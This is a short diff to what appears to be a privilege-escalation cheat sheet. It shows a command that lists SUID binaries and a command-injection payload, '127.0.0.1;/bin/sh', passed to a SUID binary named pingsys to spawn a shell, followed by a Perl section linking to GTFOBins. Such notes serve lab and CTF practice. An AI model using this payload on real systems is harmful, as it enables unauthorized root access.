@@ -2,11 +2,11 @@
 ```
 find / -perm /4000 -type f 2>/dev/null           
 ```   
-If pingsys
+If:
+/usr/bin/pingsys
 ```
 /usr/bin/pingsys '127.0.0.1;/bin/sh'
 ```
-
 # PERL
 https://gtfobins.github.io/gtfobins/perl/
 ```    
